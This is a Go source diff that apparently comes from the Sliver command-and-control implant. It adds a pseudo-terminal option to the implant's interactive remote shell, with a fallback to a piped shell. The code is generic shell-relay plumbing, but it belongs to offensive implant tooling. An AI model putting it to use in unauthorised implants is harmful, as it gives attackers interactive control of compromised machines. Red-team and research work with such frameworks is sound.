@@ -2,12 +2,17 @@ package shell
 
 import (
 	"io"
+	"runtime"
+
+	// {{if .Debug}}
 	"log"
+	// {{end}}
 	"os"
 	"os/exec"
 	"sync"
 
 	pb "sliver/protobuf/sliver"
+	"sliver/sliver/shell/pty"
 )
 
 const (
@@ -78,8 +83,17 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(command []string) *Shell {
+func StartInteractive(command []string, enablePty bool) *Shell {
 
+	if enablePty && runtime.GOOS != "windows" {
+		return ptyShell(command)
+	} else {
+		return pipedShell(command)
+	}
+
+}
+
+func pipedShell(command []string) *Shell {
 	// {{if .Debug}}
 	log.Printf("[shell] %s", command)
 	// {{end}}
@@ -140,6 +154,62 @@ func StartInteractive(command []string) *Shell {
 			log.Printf("[shell] write (stdin)")
 			// {{end}}
 			stdin.Write(incoming)
+		}
+	}()
+	cmd.Start()
+
+	return &Shell{
+		ID:    GetShellID(),
+		Path:  command[0],
+		Read:  &read,
+		Write: &write,
+	}
+}
+
+func ptyShell(command []string) *Shell {
+	// {{if .Debug}}
+	log.Printf("[ptmx] %s", command)
+	// {{end}}
+
+	var cmd *exec.Cmd
+	cmd = exec.Command(command[0], command[1:]...)
+	ptmx, err := pty.Start(cmd)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("[ptmx] %v, falling back to piped shell...", err)
+		// {{end}}
+		return pipedShell(command)
+	}
+
+	read := make(chan []byte)
+	write := make(chan []byte)
+
+	go func() {
+		buf := make([]byte, readBufSize)
+		for {
+			n, err := ptmx.Read(buf)
+			// {{if .Debug}}
+			log.Printf("[ptmx] read (stdout)")
+			// {{end}}
+			if err == io.EOF {
+				// {{if .Debug}}
+				log.Printf("[ptmx] EOF (stdout)")
+				// {{end}}
+				return
+			}
+			read <- buf[:n]
+
+		}
+	}()
+	go func() {
+		defer func() {
+			ptmx.Close()
+		}()
+		for incoming := range write {
+			// {{if .Debug}}
+			log.Printf("[ptmx] write (stdin)")
+			// {{end}}
+			ptmx.Write(incoming)
 		}
 	}()
 	cmd.Start()
